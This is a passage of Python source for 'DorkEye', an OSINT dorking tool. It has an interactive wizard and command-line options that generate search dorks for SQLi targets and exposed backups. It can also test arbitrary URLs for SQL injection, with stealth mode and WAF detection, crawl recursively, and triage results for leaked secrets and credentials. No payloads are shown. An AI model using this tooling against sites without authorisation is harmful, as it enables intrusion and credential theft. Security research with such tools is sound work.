    def ask_extensions(prompt: str) -> list:
        """Ask for a space-separated list of file extensions; normalise and return as a list."""
        raw = ask_string(prompt, ".pdf .doc .zip")
        if not raw:
            return []
        return [ext if ext.startswith(".") else f".{ext}" for ext in raw.split()]

    def pick_output() -> str:
        """Ask for an output filename; if no extension is given, prompt for format choice."""
        output = ask_string("Output filename", "results.json")
        if not output:
            return None
        if "." in os.path.basename(output):
            return output
        console.print("\n[bold cyan]Output format:[/bold cyan]")
        fmt_idx = ask_choice("Choose format", ["JSON", "CSV", "HTML", "TXT"])
        fmts    = [".json", ".csv", ".html", ".txt"]
        return output + fmts[fmt_idx]

    def collect_run_options(config: dict, ask_count: bool = True) -> int:
        """Prompt for all scan options (count, SQLi, stealth, fingerprinting, blacklist/whitelist)."""
        console.print("\n[bold cyan]┌─[ RUN OPTIONS ][/bold cyan]")
        console.print("[bold cyan]│[/bold cyan]")
        count = 50
        if ask_count:
            count_str = ask_string("│  Results per dork", "default 50")
            count     = int(count_str) if count_str.isdigit() else 50
            console.print("[bold cyan]│[/bold cyan]")
        config["sqli_detection"]      = ask_yes_no("│  Enable SQLi detection?")
        config["stealth_mode"]        = ask_yes_no("│  Enable stealth mode?")
        config["http_fingerprinting"] = not ask_yes_no("│  Disable HTTP fingerprinting?")
        config["analyze_files"]       = not ask_yes_no("│  Disable file analysis?")
        if ask_yes_no("│  Set extension blacklist?"):
            config["blacklist"] = ask_extensions("│    Blacklist extensions")
        if ask_yes_no("│  Set extension whitelist?"):
            config["whitelist"] = ask_extensions("│    Whitelist extensions")
        console.print("[bold cyan]└─>[/bold cyan]")
        return count

    def _ask_analyze(output: str) -> bool:
        """Ask the user whether to run the analysis pipeline — only if the output is .json."""
        if not output:
            return False
        if not str(output).lower().endswith(".json"):
            return False
        if not _ANALYZE_AVAILABLE:
            return False
        console.print(
            "\n[bold cyan]┌─[ RESULTS ANALYSIS ][/bold cyan]"
        )
        console.print(
            "[bold cyan]│[/bold cyan]  Results will be analyzed after the search:"
        )
        console.print(
            "[bold cyan]│[/bold cyan]  triage priority · secrets · credentials · HTML report"
        )
        try:
            console.print(
                "[bold cyan]│  Run analysis on results? y/N:[/bold cyan] ", end=""
            )
            ans = input("").strip().lower() in ("y", "yes")
        except KeyboardInterrupt:
            ans = False
        if ans:
            console.print("[bold cyan]└─>[/bold cyan] [green]Analysis enabled — will run after the search.[/green]\n")
        else:
            console.print("[bold cyan]└─>[/bold cyan] [dim]Analysis skipped.[/dim]\n")
        return ans

    def _run_analyze(results: list, output: str) -> None:
        """Run the agents pipeline and save the HTML report next to the JSON output."""
        if not results or not _ANALYZE_AVAILABLE:
            return
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_out = str(output).replace(".json", f"_analysis_{ts}.html")
        console.print(
            f"\n[bold cyan][Agents] Starting analysis on {len(results)} result(s)...[/bold cyan]"
        )
        _wiz_args = type("A", (), {
            "analyze_fetch":          False,
            "analyze_fetch_max":      20,
            "analyze_no_llm_triage":  False,
            "analyze_report":         True,
            "analyze_fmt":            "html",
            "analyze_out":            report_out,
        })()
        try:
            out = _run_agents_pipeline(
                results    = results,
                llm_plugin = None,
                args       = _wiz_args,
            )
            if out.get("report_path"):
                console.print(
                    f"[bold green][✓] Analysis report → {out['report_path']}[/bold green]"
                )
            n_sec = out.get("secrets_total", 0)
            if n_sec:
                console.print(
                    f"[bold red][!] {n_sec} secret(s) detected — see the report.[/bold red]"
                )
        except Exception as _ae:
            console.print(f"[yellow][Agents] Error: {_ae}[/yellow]")

    def _ask_crawl() -> dict | None:
        """Ask whether to enable the adaptive recursive crawl after the search.

        Returns:
            dict with crawl options if confirmed, None otherwise.
        """
        if not _ANALYZE_AVAILABLE:
            return None

        console.print("\n[bold cyan]┌─[ RECURSIVE CRAWL ][/bold cyan]")
        console.print(
            "[bold cyan]│[/bold cyan] [i] After the initial search, the crawler runs additional refinement rounds"
        )

        console.print(
            "[bold cyan]│[/bold cyan]  [dim](refining dorks based on: domains · paths · technologies · extensions)[/dim]"
        )
        try:
            console.print(
                "[bold cyan]│  Enable recursive crawl? y/N:[/bold cyan] ", end=""
            )
            ans = input("").strip().lower() in ("y", "yes")
        except KeyboardInterrupt:
            ans = False

        if not ans:
            console.print("[bold cyan]└─>[/bold cyan] [dim]Crawl skipped.[/dim]\n")
            return None

        # ── Number of rounds ────────────────────────────────────────────────────
        console.print("[bold cyan]│[/bold cyan]")
        console.print("[bold cyan]│  Number of rounds:[/bold cyan]")
        rounds_idx = ask_choice(
            "Rounds",
            [
                "2  [dim]— fast, minimal footprint[/dim]",
                "4  [dim]— balanced (default)[/dim]",
                "6  [dim]— thorough[/dim]",
                "10 [dim]— maximum, very slow[/dim]",
            ],
            default=1,
        )
        rounds_map = [2, 4, 6, 10]
        rounds     = rounds_map[rounds_idx]

        # ── Stealth ───────────────────────────────────────────────────────────
        console.print("[bold cyan]│[/bold cyan]")
        stealth = ask_yes_no("│  Stealth mode for crawl (longer delays)? ")

        # ── Final report ──────────────────────────────────────────────────────────
        console.print("[bold cyan]│[/bold cyan]")
        do_report = ask_yes_no("│  Generate HTML report at the end of the crawl?", default_yes=True)

        console.print(
            f"[bold cyan]└─>[/bold cyan] [green]Crawl enabled "
            f"— {rounds} round(s){'  · stealth' if stealth else ''}[/green]\n"
        )
        return {
            "rounds":     rounds,
            "stealth":    stealth,
            "do_report":  do_report,
            "max":        300,
            "per_dork":   20,
        }

    def _run_crawl_wizard(seed_dorks: list, crawl_opts: dict, output: str) -> None:
        """Run DorkCrawlerAgent with the options chosen in the wizard session."""
        if not crawl_opts or not _ANALYZE_AVAILABLE:
            return

        ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = None
        if crawl_opts["do_report"]:
            base        = os.path.splitext(output)[0] if output else f"dorkeye_crawl_{ts}"
            report_path = f"{base}_crawl_{ts}.html"

        # Namespace compatible with run_crawl()
        _crawl_args = type("A", (), {
            "crawl_rounds":   crawl_opts["rounds"],
            "crawl_max":      crawl_opts["max"],
            "crawl_per_dork": crawl_opts["per_dork"],
            "crawl_stealth":  crawl_opts["stealth"],
            "crawl_report":   crawl_opts["do_report"],
            "crawl_out":      report_path,
        })()

        console.print(
            f"\n[bold cyan][Crawl] Starting recursive crawl — "
            f"{crawl_opts['rounds']} round max · "
            f"stealth: {'on' if crawl_opts['stealth'] else 'off'}[/bold cyan]"
        )
        try:
            crawl_out = run_crawl(
                seed_dorks = seed_dorks,
                args       = _crawl_args,
                target     = "",
            )
            n_new = len(crawl_out.get("results", []))
            console.print(
                f"[bold green][Crawl] Completed — "
                f"{crawl_out.get('rounds', 0)} round(s) · "
                f"{n_new} result(s) · "
                f"stop: {crawl_out.get('stop_reason', '?')}[/bold green]"
            )
            if crawl_out.get("report_path"):
                console.print(
                    f"[bold green][✓] Report crawl → {crawl_out['report_path']}[/bold green]"
                )
        except Exception as _ce:
            console.print(f"[yellow][Crawl] Error: {_ce}[/yellow]")

    # ── Main menu ────────────────────────────────────────────────────────────

    MAIN_MENU = [
        ("Google Dork Search",   "Search DuckDuckGo with dork(s)"),
        ("Dork Generator",       "Auto-generate dorks from templates"),
        ("Create sample config", "Write dorkeye_config.yaml to disk"),
        ("Exit",                 ""),
    ]

    while True:
        console.print("\n[bold cyan]┌─[ MAIN MENU ][/bold cyan]")
        for i, (label, desc) in enumerate(MAIN_MENU, 1):
            hint = f"  [dim]{desc}[/dim]" if desc else ""
            console.print(f"[bold cyan]│[/bold cyan]  [yellow]{i})[/yellow] {label}{hint}")
        console.print("[bold cyan]└─>[/bold cyan] ", end="")

        try:
            choice = input("").strip()
        except KeyboardInterrupt:
            console.print("\n[red]Aborted.[/red]")
            return

        if choice == "3":
            create_sample_config()
            continue

        if choice == "4":
            EXIT_MESSAGES = [
                ("Logs don't lie. Neither do we.", "dim"),
                ("Close the terminal. Not the curiosity.", "bold green"),
                ("Stay ghost.", "bold cyan"),
                ("What you found stays between you and the data.", "dim"),
                ("The internet remembers. Do you?", "bold yellow"),
                ("Session closed. Footprints: yours to manage.", "dim"),
                ("Offline is the new safe.", "bold magenta"),
                ("Until next time. Watch your back.", "bold red"),
                ("The dork never sleeps. You can.", "dim"),
                ("Cover your tracks.", "bold cyan"),
                ("Good hunt.", "bold green"),
                ("VPN off? Bad idea.", "bold red"),
                ("They're still out there. So are the vulnerabilities.", "dim"),
                ("Knowledge is the only payload that matters.", "bold yellow"),
                ("Exit clean.", "bold cyan"),
            ]
            msg, color = random.choice(EXIT_MESSAGES)
            console.print(f"[{color}]{msg}[/{color}]")
            return

        config = load_config(None)

        # ── Choice 1: Google Dork Search ─────────────────────────────────────
        if choice == "1":
            console.print("\n[bold cyan]┌─[ GOOGLE DORK SEARCH ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] [dim]← Back to main menu[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]1)[/yellow] Single dork  [dim](type a dork string)[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]2)[/yellow] Load from file  [dim](.txt, one dork per line)[/dim]")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                sub = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if sub == "0":
                continue
            if sub == "1":
                dork_input = ask_string("Enter dork string")
                if not dork_input:
                    console.print("[red][!] Empty dork. Aborting.[/red]")
                    continue
            elif sub == "2":
                dork_input = ask_string("ex: dorks.txt")
                if not os.path.isfile(dork_input):
                    console.print(f"[red][!] File not found: {dork_input}[/red]")
                    continue
            else:
                console.print("[red][!] Invalid choice.[/red]")
                continue

            count  = collect_run_options(config, ask_count=True)
            output = pick_output()

            # ── Ask for analysis before starting (only if .json output) ────────
            do_analyze  = _ask_analyze(output)
            # ── Ask for recursive crawl ──────────────────────────────────────
            crawl_opts  = _ask_crawl()

            dorkeye = DorkEyeEnhanced(config, output)
            dorks   = dorkeye.process_dorks(dork_input)
            console.print(f"\n[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
            console.print("[bold cyan]└─>[/bold cyan] Starting ...\n")
            try:
                dorkeye.run_search(dorks, count)
            except KeyboardInterrupt:
                console.print("\n[red][!] Search interrupted.[/red]")
            dorkeye.print_statistics()
            if output:
                console.print(f"\n[bold green][✓] Results saved: {output}[/bold green]")

            # ── Post-search analysis ─────────────────────────────────────────────
            if do_analyze and dorkeye.results:
                _run_analyze(dorkeye.results, output)

            # ── Adaptive recursive crawl ─────────────────────────────────────
            if crawl_opts and dorks:
                _run_crawl_wizard(dorks, crawl_opts, output or "")
            continue

        # ── Choice 2: Dork Generator ─────────────────────────────────────────
        if choice == "2":
            console.print("\n[bold cyan]┌─[ DORK GENERATOR — TEMPLATE ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] [dim]← Back to main menu[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]1)[/yellow] Default template")
            console.print("[bold cyan]│[/bold cyan]  [yellow]2)[/yellow] All templates")
            console.print("[bold cyan]│[/bold cyan]  [yellow]3)[/yellow] Specific template file")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                tmpl_choice = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if tmpl_choice == "0":
                continue
            if tmpl_choice == "1":
                template_files = resolve_templates_argument(None)
            elif tmpl_choice == "2":
                template_files = resolve_templates_argument("all")
            elif tmpl_choice == "3":
                tmpl_name = ask_string("Template filename", "dorks_templates.yaml")
                if not tmpl_name:
                    console.print("[red][!] No filename given.[/red]")
                    continue
                template_files = resolve_templates_argument(tmpl_name)
            else:
                console.print("[red][!] Invalid choice.[/red]")
                continue

            VALID_CATEGORIES = get_categories_from_templates(template_files)
            if not VALID_CATEGORIES:
                console.print("[red][!] No categories found in templates.[/red]")
                continue

            console.print("\n[bold cyan]┌─[ DORK GENERATOR — CATEGORY ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] ALL categories")
            for i, cat in enumerate(VALID_CATEGORIES, 1):
                console.print(f"[bold cyan]│[/bold cyan]  [yellow]{i})[/yellow] {cat}")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                cat_choice = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if cat_choice == "0":
                selected_categories = VALID_CATEGORIES
            else:
                try:
                    idx                 = int(cat_choice) - 1
                    selected_categories = [VALID_CATEGORIES[idx]]
                except (ValueError, IndexError):
                    console.print("[red][!] Invalid selection.[/red]")
                    continue

            console.print("\n[bold cyan]┌─[ DORK GENERATOR — MODE ][/bold cyan]")
            mode_idx = ask_choice(
                "Choose mode",
                ["soft  (safe, minimal footprint)", "medium  (balanced coverage)", "aggressive  (maximum coverage)"]
            )
            mode = VALID_MODES[mode_idx]

            collect_run_options(config, ask_count=False)
            output = pick_output()

            # ── Ask for analysis before starting (only if .json output) ────────
            do_analyze  = _ask_analyze(output)
            # ── Ask for recursive crawl ──────────────────────────────────────
            crawl_opts  = _ask_crawl()

            all_dorks = []
            for template_file in template_files:
                generator = DorkGenerator(str(template_file))
                all_dorks.extend(generator.generate(categories=selected_categories, mode=mode))

            console.print(f"\n[cyan][*] Generated {len(all_dorks)} dorks (mode: {mode})[/cyan]")
            console.print(f"[cyan][*] Categories: {', '.join(selected_categories)}[/cyan]")
            console.print(f"\n[bold cyan]┌─[ LOADED {len(all_dorks)} DORK(s) ][/bold cyan]")
            console.print("[bold cyan]└─>[/bold cyan] Starting ...\n")

            dorkeye = DorkEyeEnhanced(config, output)
            try:
                dorkeye.run_search(all_dorks, 50)
            except KeyboardInterrupt:
                console.print("\n[red][!] Search interrupted.[/red]")
            dorkeye.print_statistics()
            if output:
                console.print(f"\n[bold green][✓] Results saved: {output}[/bold green]")

            # ── Post-search analysis ─────────────────────────────────────────────
            if do_analyze and dorkeye.results:
                _run_analyze(dorkeye.results, output)

            # ── Adaptive recursive crawl ─────────────────────────────────────
            if crawl_opts and all_dorks:
                _run_crawl_wizard(all_dorks, crawl_opts, output or "")
            continue

        console.print("[red][!] Invalid option.[/red]")


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    """Entry point: dispatch to --wizard mode or parse CLI flags and run the appropriate pipeline."""
    if "--wizard" in sys.argv:
        greet_user()
        run_wizard()
        return

    greet_user()

    parser = argparse.ArgumentParser(
        description="DorkEye v4.8 | OSINT Dorking Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:

  # Interactive wizard
    %(prog)s --wizard

  # Dork Search  (-o .json enables automatic analysis)
    %(prog)s -d "site:example.com filetype:pdf" -o results.json
    %(prog)s -d dorks.txt -c 100 -o output.html

  # Direct SQLi test on a URL
    %(prog)s -u "https://example.com/page.php?id=1" --sqli -o sqli_result.json
    %(prog)s -u "https://example.com/page.php?id=1" --sqli --stealth

  # Load saved results file for SQLi / analysis / crawl
    %(prog)s -f Dump/results.json --sqli -o retest.json
    %(prog)s -f Dump/results.json --analyze --analyze-fetch-max=5000 -o reanalyzed.json
    %(prog)s -f Dump/results.json --sqli --crawl -o full_retest.json

  # Dork Generator
    %(prog)s --dg=all
    %(prog)s --dg=sqli --mode=medium --sqli --stealth -o results.json
    %(prog)s --dg=backups --templates=dorks_templates_research.yaml -o output.json
    %(prog)s --dg=all --mode=aggressive -o results.json
    %(prog)s --dg=all --dg-max=10000 -o big.json

  # Search + integrated automatic analysis (output .json)
    %(prog)s -d dorks.txt -o results.json --analyze
    %(prog)s --dg=sqli --mode=medium -o results.json --analyze --analyze-fetch

  # Adaptive recursive crawl (automatic multi-round refinement, no AI)
    %(prog)s -d "site:example.com inurl:admin" --crawl -o crawl.json
    %(prog)s --dg=sqli --crawl --crawl-rounds=5 --crawl-report -o crawl.json
    %(prog)s -d dorks.txt --crawl --crawl-stealth --crawl-max=200 --crawl-out=report.html

  # Standalone analysis on a saved results file
    python dorkeye_analyze.py Dump/results.json --fetch --fmt=html

"""
    )

    parser.add_argument("--wizard",          action="store_true", help="Launch interactive wizard")
    parser.add_argument("-d", "--dork",      help="Single dork or file containing dorks")
    parser.add_argument("-u", "--url",       help="Direct URL to test for SQLi (use with --sqli)")
    parser.add_argument("-f", "--file",      help="Load results from a DorkEye .json or .txt file (combine with --sqli, --analyze, --crawl)")
    parser.add_argument("-o", "--output",    help="Output filename (.json enables automatic analysis prompt)")
    parser.add_argument("-c", "--count",     type=int, default=50, help="Results per dork (default: 50)")
    parser.add_argument("--config",          help="Configuration file (YAML or JSON)")
    parser.add_argument("--no-analyze",      action="store_true", help="Disable file analysis")
    parser.add_argument("--sqli",            action="store_true", help="Enable SQL injection detection")
    parser.add_argument("--stealth",         action="store_true", help="Enable stealth mode (slower, safer)")
    parser.add_argument("--no-fingerprint",  action="store_true", help="Disable HTTP fingerprinting")
    parser.add_argument("--templates",       type=str, help="Template file in Templates/")
    parser.add_argument("--dg",              action="append", nargs="?", const="all", help="Activate Dork Generator")
    parser.add_argument("--dg-max",          type=int, default=800, help="Max dork combinations per template (default: 800)")
    parser.add_argument("--mode",            nargs="?", const="soft", default="soft", help="Generation mode: soft | medium | aggressive")
    parser.add_argument("--blacklist",       nargs="+", help="Extensions to blacklist")
    parser.add_argument("--whitelist",       nargs="+", help="Extensions to whitelist")
    parser.add_argument("--create-config",   action="store_true", help="Create sample configuration file")
    # ── Integrated analysis ───────────────────────────────────────────────────────
    parser.add_argument(
        "--analyze",
        action="store_true",
        help="Run post-search analysis pipeline (triage + secrets). Forced when -o is .json"
    )
    parser.add_argument(
        "--analyze-fetch",
        action="store_true",
        help="Download page content for HIGH/CRITICAL results for deeper analysis"
    )
    parser.add_argument(
        "--analyze-fetch-max",
        type=int, default=20,
        help="Maximum pages to download (default: 20)"
    )
    parser.add_argument(
        "--analyze-fmt",
        choices=["html", "md", "json", "txt"],
        default="html",
        help="Analysis report format (default: html)"
    )
    parser.add_argument(
        "--analyze-out",
        type=str, default=None,
        help="Analysis report path (default: auto-generated next to the -o file)"
    )
    add_crawler_args(parser)

    args = parser.parse_args()

    for arg in sys.argv:
        if arg.startswith("--templates") and not arg.startswith("--templates="):
            console.print("[red][!] Use --templates=filename.yaml format (no spaces)[/red]")
            sys.exit(1)

    VALID_CATEGORIES: List[str] = []
    if args.dg or args.templates:
        template_files_for_validation = resolve_templates_argument(args.templates)
        VALID_CATEGORIES = get_categories_from_templates(template_files_for_validation)
        if not VALID_CATEGORIES and args.dg:
            parser.error("No categories found in template files.")

    selected_categories = None
    if args.dg:
        if len(args.dg) > 1:
            parser.error("Multiple --dg arguments are not allowed.")
        dg_value = args.dg[0]
        if dg_value == "all":
            selected_categories = VALID_CATEGORIES
        else:
            if dg_value not in VALID_CATEGORIES:
                parser.error(f"Invalid category '{dg_value}'. Available: {', '.join(VALID_CATEGORIES)}")
            selected_categories = [dg_value]

    if args.mode not in VALID_MODES:
        parser.error(f"Invalid mode '{args.mode}'. Available: {', '.join(VALID_MODES)}")

    print_banner()

    if args.create_config:
        create_sample_config()
        return

    if not args.dork and not args.dg and not getattr(args, "url", None) and not getattr(args, "file", None):
        parser.print_help()
        return

    config = load_config(args.config)

    if args.no_analyze:     config["analyze_files"]       = False
    if args.sqli:           config["sqli_detection"]      = True
    if args.stealth:        config["stealth_mode"]        = True
    if args.no_fingerprint: config["http_fingerprinting"] = False
    if args.blacklist:      config["blacklist"]            = args.blacklist
    if args.whitelist:      config["whitelist"]            = args.whitelist

    output_file = args.output
    if not output_file:
        output_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        console.print(
            f"[dim][~] No -o specified — saving to [bold]{output_file}[/bold][/dim]"
        )

    # ── Auto-detect .json output: ask for analysis BEFORE the search ─────────────
    _is_json_output = str(output_file).lower().endswith(".json")
    _do_analyze     = args.analyze or _is_json_output

    if _is_json_output and not args.analyze and _ANALYZE_AVAILABLE:
        console.print(
            "\n[bold cyan]┌─[ RESULTS ANALYSIS ][/bold cyan]"
        )
        console.print(
            "[bold cyan]│[/bold cyan]  .json output detected — analysis available after the search:"
        )
        console.print(
            "[bold cyan]│[/bold cyan]  triage priority · secrets · credentials · HTML report"
        )
        console.print(
            "[bold cyan]│  Run analysis on results? [y/N]:[/bold cyan] ", end=""
        )
        try:
            _do_analyze = input("").strip().lower() in ("y", "yes")
        except KeyboardInterrupt:
            _do_analyze = False
        if _do_analyze:
            console.print("[bold cyan]└─>[/bold cyan] [green]Analysis enabled.[/green]\n")
        else:
            console.print("[bold cyan]└─>[/bold cyan] [dim]Analysis skipped.[/dim]\n")
    elif args.analyze and not _ANALYZE_AVAILABLE:
        console.print("[yellow][!] dorkeye_agents.py not found — analysis not available.[/yellow]")
        _do_analyze = False

    dorkeye = DorkEyeEnhanced(config, output_file)

    # ── -u / --url: direct SQLi test on a single URL ─────────────────────────
    if getattr(args, "url", None):
        target_url = args.url
        console.print(f"\n[bold cyan]┌─[ DIRECT URL TEST ][/bold cyan]")
        console.print(f"[bold cyan]│[/bold cyan]  Target → [cyan]{_rich_escape(target_url)}[/cyan]")
        if not config.get("sqli_detection", False):
            console.print("[bold cyan]│[/bold cyan]  [yellow][!] --sqli not specified — enabling SQLi detection automatically[/yellow]")
            config["sqli_detection"] = True
            dorkeye.config["sqli_detection"] = True
            dorkeye.analyzer.config["sqli_detection"] = True
        console.print("[bold cyan]└─>[/bold cyan] Starting SQLi test...\n")
        _detector = SQLiDetector(
            stealth=config.get("stealth_mode", False),
            timeout=config.get("request_timeout", 10),
        )
        _sqli_result = _detector.test_sqli(target_url)
        # ── Print result ──────────────────────────────────────────────────────
        console.print("\n[bold yellow]┌─[ SQLi Test Result ][/bold yellow]")
        _tested  = _sqli_result.get("tested", False)
        _vuln    = _sqli_result.get("vulnerable", False)
        _conf    = _sqli_result.get("overall_confidence", "none")
        _waf     = _sqli_result.get("waf_detected")
        _msg     = _sqli_result.get("message", "")
        if not _tested:
            console.print(f"[bold yellow]│[/bold yellow]  [yellow][~] Not tested — {_msg}[/yellow]")
        elif _vuln:
            _style = "bold magenta" if _conf == SQLiConfidence.CRITICAL.value else "bold red"
            console.print(f"[bold yellow]│[/bold yellow]  [{_style}][!] VULNERABLE ({_conf})[/{_style}]  {_rich_escape(target_url)}")
            for _t in _sqli_result.get("tests", []):
                if _t.get("vulnerable"):
                    _method = _t.get("method", "?")
                    _ev     = " | ".join(_t.get("evidence", [])[:2])
                    _param  = _t.get("parameter", "")
                    _p_str  = f" [param: {_param}]" if _param else ""
                    console.print(f"[bold yellow]│[/bold yellow]    [dim]↳ method: [yellow]{_method}[/yellow]{_p_str}  evidence: [italic]{_rich_escape(_ev[:120])}[/italic][/dim]")
        else:
            console.print(f"[bold yellow]│[/bold yellow]  [green][✓] SAFE[/green]  {_rich_escape(target_url)}")
        if _waf:
            console.print(f"[bold yellow]│[/bold yellow]  [yellow][~] WAF detected: {_waf}[/yellow]")
        console.print(f"[bold yellow]└─>[/bold yellow]  {_msg}")
        # ── Optionally save ───────────────────────────────────────────────────
        if output_file:
            _entry = {
                "url":       target_url,
                "title":     "",
                "snippet":   "",
                "dork":      "",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "extension": dorkeye.analyzer.get_file_extension(target_url),
                "category":  dorkeye.analyzer.categorize_url(target_url),
                "sqli_test": _sqli_result,
            }
            dorkeye.results.append(_entry)
            if _vuln:
                dorkeye.stats["sqli_vulnerable"] += 1
            if _waf:
                dorkeye.stats["waf_detected"] += 1
            dorkeye.save_results()
            console.print(f"\n[bold green][✓] Result saved → Dump/{output_file}[/bold green]")
        return

    # ── -f / --file: load results from saved file + re-run analysis/sqli/crawl ─
    if getattr(args, "file", None):
        _file_path = args.file
        console.print(f"\n[bold cyan]┌─[ FILE MODE ][/bold cyan]")
        console.print(f"[bold cyan]│[/bold cyan]  Loading results from: [cyan]{_file_path}[/cyan]")
        _loaded = _load_results_from_file(_file_path)
        if not _loaded:
            console.print("[bold cyan]└─>[/bold cyan] [red]No results loaded — aborting.[/red]")
            return
        console.print(f"[bold cyan]│[/bold cyan]  Loaded [green]{len(_loaded)}[/green] result(s)")

        # Determine what to do with the loaded URLs
        _do_sqli    = config.get("sqli_detection", False)
        _do_analyze = args.analyze or str(output_file).lower().endswith(".json")
        _do_crawl   = getattr(args, "crawl", False)

        console.print(
            f"[bold cyan]│[/bold cyan]  SQLi: {'[bold red]ON[/bold red]' if _do_sqli else '[dim]off[/dim]'} │ "
            f"Analyze: {'[bold green]ON[/bold green]' if _do_analyze and _ANALYZE_AVAILABLE else '[dim]off[/dim]'} │ "
            f"Crawl: {'[bold green]ON[/bold green]' if _do_crawl and _ANALYZE_AVAILABLE else '[dim]off[/dim]'}"
        )
        console.print("[bold cyan]└─>[/bold cyan] Processing...\n")

        # Reconstruct url_hashes to avoid false duplicates in save
        for _r in _loaded:
            _h = dorkeye._hash_url(_r.get("url", ""))
            dorkeye.url_hashes.add(_h)

        if _do_sqli and _loaded:
            _analyzed = dorkeye.analyze_results(_loaded)
            dorkeye.results = _analyzed
        else:
            dorkeye.results = _loaded

        dorkeye.print_statistics()

        if output_file:
            dorkeye.save_results()
            console.print(f"\n[bold green][✓] Results saved → Dump/{output_file}[/bold green]")

        # ── Integrated analysis on loaded file ───────────────────────────────────
        if _do_analyze and dorkeye.results and _ANALYZE_AVAILABLE:
            console.print(
                f"\n[bold cyan][Agents] Starting analysis on {len(dorkeye.results)} result(s)...[/bold cyan]"
            )
            ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
            fmt        = args.analyze_fmt
            report_out = args.analyze_out
            if not report_out:
                base       = str(output_file).replace(".json", "").replace(".html", "")
                report_out = f"{base}_analysis_{ts}.{fmt}"
            _analyze_args_f = type("A", (), {
                "analyze_fetch":         args.analyze_fetch,
                "analyze_fetch_max":     args.analyze_fetch_max,
                "analyze_no_llm_triage": False,
                "analyze_report":        True,
                "analyze_fmt":           fmt,
                "analyze_out":           report_out,
            })()
            try:
                _result_f = _run_agents_pipeline(
                    results    = dorkeye.results,
                    llm_plugin = None,
                    args       = _analyze_args_f,
                )
                if _result_f.get("report_path"):
                    console.print(
                        f"[bold green][✓] Analysis report → {_result_f['report_path']}[/bold green]"
                    )
                _n_sec = _result_f.get("secrets_total", 0)
                if _n_sec:
                    console.print(
                        f"[bold red][!] {_n_sec} secret(s) detected — see the report.[/bold red]"
                    )
            except Exception as _fae:
                console.print(f"[yellow][Analyzer] Error: {_fae}[/yellow]")

        # ── Recursive crawl on loaded results ─────────────────────────────────
        if _do_crawl and _ANALYZE_AVAILABLE:
            console.print("\n[bold cyan][Crawl] Starting crawl on loaded results...[/bold cyan]")
            _seed_dorks = list({r.get("dork", "") for r in dorkeye.results if r.get("dork")})
            if not _seed_dorks:
                _seed_dorks = [r.get("url", "") for r in dorkeye.results[:10]]
            try:
                _crawl_out_f = run_crawl(
                    seed_dorks = _seed_dorks,
                    args       = args,
                    target     = "",
                )
                if _crawl_out_f.get("results"):
                    _existing_urls = {r.get("url") for r in dorkeye.results}
                    _new_crawl     = [r for r in _crawl_out_f["results"] if r.get("url") not in _existing_urls]
                    dorkeye.results.extend(_new_crawl)
                    if output_file:
                        dorkeye.save_results()
                    console.print(
                        f"\n[bold green][Crawl] Completed — "
                        f"{_crawl_out_f['rounds']} round(s) | "
                        f"+{len(_new_crawl)} new result(s) | "
                        f"stop: {_crawl_out_f['stop_reason']}[/bold green]"
                    )
            except Exception as _fce:
                console.print(f"[yellow][Crawl] Error: {_fce}[/yellow]")

        return

    # ── Dork source ───────────────────────────────────────────────────────────
    if args.dg:
        template_files = resolve_templates_argument(args.templates)
        console.print(f"[cyan][*] Loaded template(s): {', '.join([t.name for t in template_files])}[/cyan]")
        all_dorks = []
        for template_file in template_files:
            generator = DorkGenerator(str(template_file), max_combinations=args.dg_max)
            all_dorks.extend(generator.generate(categories=selected_categories, mode=args.mode))
        dorks = all_dorks
        console.print(f"[cyan][*] Generated {len(dorks)} dorks (mode: {args.mode})[/cyan]")
        if selected_categories:
            console.print(f"[cyan][*] Categories: {', '.join(selected_categories)}[/cyan]")
    else:
        dorks = dorkeye.process_dorks(args.dork)

    console.print(f"[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
    console.print(f"[bold cyan]└─>[/bold cyan] Starting ... \n")

    try:
        dorkeye.run_search(dorks, args.count)
    except KeyboardInterrupt:
        console.print("\n[red][!] Search interrupted by user![/red]")

    dorkeye.print_statistics()

    # ── Integrated post-search analysis ──────────────────────────────────────────
    if _do_analyze and dorkeye.results and _ANALYZE_AVAILABLE:
        console.print(
            f"\n[bold cyan][Agents] Starting analysis on {len(dorkeye.results)} result(s)...[/bold cyan]"
        )
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        fmt        = args.analyze_fmt
        report_out = args.analyze_out
        if not report_out:
            base       = str(output_file).replace(".json", "")
            report_out = f"{base}_analysis_{ts}.{fmt}"

        _analyze_args = type("A", (), {
            "analyze_fetch":         args.analyze_fetch,
            "analyze_fetch_max":     args.analyze_fetch_max,
            "analyze_no_llm_triage": False,
            "analyze_report":        True,
            "analyze_fmt":           fmt,
            "analyze_out":           report_out,
        })()
        try:
            result = _run_agents_pipeline(
                results    = dorkeye.results,
                llm_plugin = None,
                args       = _analyze_args,
            )
            if result.get("report_path"):
                console.print(
                    f"[bold green][✓] Analysis report → {result['report_path']}[/bold green]"
                )
            n_sec = result.get("secrets_total", 0)
            if n_sec:
                console.print(
                    f"[bold red][!] {n_sec} secret(s) detected — see the report.[/bold red]"
                )
        except Exception as _ae:
